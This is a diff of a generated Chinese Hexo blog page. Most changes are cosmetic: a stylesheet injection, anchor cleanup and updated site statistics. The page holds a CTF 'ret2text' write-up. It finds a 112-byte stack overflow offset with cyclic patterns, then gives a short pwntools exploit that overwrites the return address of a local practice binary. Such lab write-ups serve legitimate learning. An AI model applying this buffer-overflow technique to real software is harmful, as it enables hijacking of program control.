@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -148,7 +150,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T2-ret2text-%E4%B8%8A%E9%A2%98%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="nav-text">T2 ret2text(上题的另一种解法)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T2 ret2text(上题的另一种解法)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -174,7 +176,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -366,13 +368,13 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T2-ret2text-上题的另一种解法"><a href="#T2-ret2text-上题的另一种解法" class="headerlink" title="T2 ret2text(上题的另一种解法)"></a>T2 ret2text(上题的另一种解法)</h2><blockquote>
+        <h2><span id="t2-ret2text上题的另一种解法">T2 ret2text(上题的另一种解法)</span></h2><blockquote>
 <p>2023-01-09WP<br>网上看到另一种暴力解法感觉很不错于是自己做过了一遍<br><strong>0x01</strong>与<strong>0x02</strong>跟上题相同</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可<br>先用cyclic生成有序字符队列<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>运行并输入生成的字符串<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>得到invalid addres  0x62616164<br>用cyclic -l查找偏移量<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<h3><span id="0x03">0x03</span></h3><p>大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可<br>先用cyclic生成有序字符队列<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>运行并输入生成的字符串<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>得到invalid addres  0x62616164<br>用cyclic -l查找偏移量<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
+<h3><span id="0x04">0x04</span></h3><p>写exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2text&#x27;)</span><br><span class="line">success_addr = 0x0804863A</span><br><span class="line">payload = b&#x27;a&#x27; * 112  + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
@@ -581,13 +583,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
